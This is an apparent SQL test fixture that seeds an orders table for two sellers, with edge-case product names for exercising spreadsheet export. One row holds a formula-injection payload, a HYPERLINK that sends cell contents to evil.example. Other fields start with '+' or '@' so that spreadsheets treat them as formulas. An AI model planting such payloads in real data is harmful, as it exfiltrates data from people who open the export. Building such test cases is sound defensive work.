-- Two sellers. Some product names are what sellers really type, and some are what an attacker would.
INSERT INTO orders (seller_id, order_ref, placed_at, product_name, quantity, amount_paise, buyer_city, status) VALUES
    (1, 'KW-1001', '2026-01-05 10:15+05:30', 'Cotton kurta, blue', 2, 129900, 'Pune', 'DELIVERED'),
    (1, 'KW-1002', '2026-03-17 23:50+05:30', 'Mug "Chai time"', 1, 34900, 'Chennai', 'SHIPPED'),
    (1, 'KW-1003', '2026-06-30 18:29+05:30', '=HYPERLINK("http://evil.example/?d="&A1,"Click for refund")', 1, 9900, 'Delhi', 'PLACED'),
    (1, 'KW-1004', '2026-07-01 09:00+05:30', '+91 Special offer', 3, 59700, '@Mumbai', 'CANCELLED'),
    (1, 'KW-1005', '2026-12-31 23:59+05:30', 'साड़ी, सिल्क', 1, 459900, 'Varanasi', 'PLACED'),
    (2, 'AM-2001', '2026-02-11 12:00+05:30', 'Steel bottle', 1, 49900, 'Kochi', 'DELIVERED');
